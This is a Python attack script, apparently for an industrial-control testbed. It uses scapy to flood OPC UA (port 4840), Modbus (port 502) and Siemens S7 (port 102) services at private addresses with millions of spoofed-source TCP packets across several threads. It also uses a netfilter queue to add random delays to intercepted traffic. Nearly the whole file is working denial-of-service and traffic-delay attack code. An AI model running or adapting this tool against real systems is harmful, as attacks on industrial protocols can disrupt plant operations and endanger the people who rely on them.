import random
from time import sleep
from scapy.all import *
from netfilterqueue import NetfilterQueue
target_IP_OPC = "10.0.0.3" #port 4840

target_IP_Mod = "10.0.0.2" #port 502

target_IP_s7 ="10.0.0.1" #port 102

used_ips = []

def get_random_ip():
    valid_ip = False
    while not valid_ip:
        first_part = "172.17.0."
        last_part = str(random.randint(1,254))
        final_ip = first_part + last_part
        if final_ip not in used_ips:
            used_ips.append(final_ip)
            valid_ip = True
    return final_ip


def dos_opc():
    src_ip = get_random_ip()
    print(src_ip)
    for i in range(0,1000000):
        src_port = random.randint(1,65535)
        ip = IP(src = src_ip, dst=target_IP_OPC)
        tcp = TCP(sport= src_port, dport=4840)
        pkt = ip / tcp / Raw(RandString(size=100))
        send(pkt,inter=.001)


def dos_modbus():
    src_ip = get_random_ip()
    print(src_ip)
    for i in range(0,1000000):
        src_port = random.randint(1,65535)
        ip = IP(src = src_ip, dst=target_IP_Mod)
        tcp = TCP(sport= src_port, dport=502)
        pkt = ip / tcp / Raw(RandString(size=100))
        send(pkt,inter=.001)

def dos_s7():
    src_ip = get_random_ip()
    print(src_ip)
    for i in range(0,1000000):
        src_port = random.randint(1,65535)
        ip = IP(src = src_ip, dst=target_IP_s7)
        tcp = TCP(sport= src_port, dport=102)
        pkt = ip / tcp / Raw(RandString(size=100))
        send(pkt,inter=.001)


def delay(packet):
    print("Entra muchisisismo")
    tempo = random.uniform(0.5,10)
    sleep(tempo)
    packet.accept()

if __name__=="__main__":
    for i in range(0,9):
        if i in range(0,3):
            x = threading.Thread(target=dos_opc, args=())
            x.start()
        elif i in range(3,6):
            x = threading.Thread(target=dos_modbus, args=())
            x.start()
        else:
            x = threading.Thread(target=dos_s7, args=())
            x.start()
    
    nfqueue = NetfilterQueue()
    nfqueue.bind(2, delay)
    try:
        print ("[*] waiting for data to delay")
        nfqueue.run()
    except KeyboardInterrupt:
        nfqueue.unbind()
    


   